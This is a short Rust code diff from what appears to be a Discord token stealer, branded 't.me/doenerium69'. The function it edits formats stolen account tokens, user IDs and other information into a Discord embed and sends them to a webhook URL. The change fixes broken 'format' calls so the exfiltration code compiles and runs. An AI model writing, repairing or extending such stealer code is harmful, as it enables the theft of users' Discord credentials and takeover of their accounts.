@@ -151,7 +151,11 @@ pub fn send_data(webhook_url: &str, data: &str, username: &str) -> Result<u16, (
     let id = parts[1].trim_matches(|c| c == '[' || c == ']').replace("\"", "");
     let other_info = parts[2].trim().replace("\"", "");
 
-    // Construction de l'Embed Discord avec le username dans le titre
+
+let formatted_token = format!("```{}```", token);
+let formatted_id = format!("```{}```", id);
+let formatted_other_info = format!("```{}```", other_info);
+
 let payload = serde_json::json!({
     "username": "t.me/doenerium69",
     "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
@@ -162,15 +166,15 @@ let payload = serde_json::json!({
             "fields": [
                 {
                     "name": "Token:",
-                    "value": format!("```{}```", token),  // Formatage du token comme code Markdown pré-formaté
+                    "value": formatted_token,
                 },
                 {
                     "name": "ID:",
-                    "value": format("```{}```", id),  // Formatage de l'ID comme code Markdown pré-formaté
+                    "value": formatted_id,
                 },
                 {
                     "name": "Other Info:",
-                    "value": format("```{}```", other_info),  // Formatage des autres informations comme code Markdown pré-formaté
+                    "value": formatted_other_info,
                 },
             ],
             "thumbnail": {
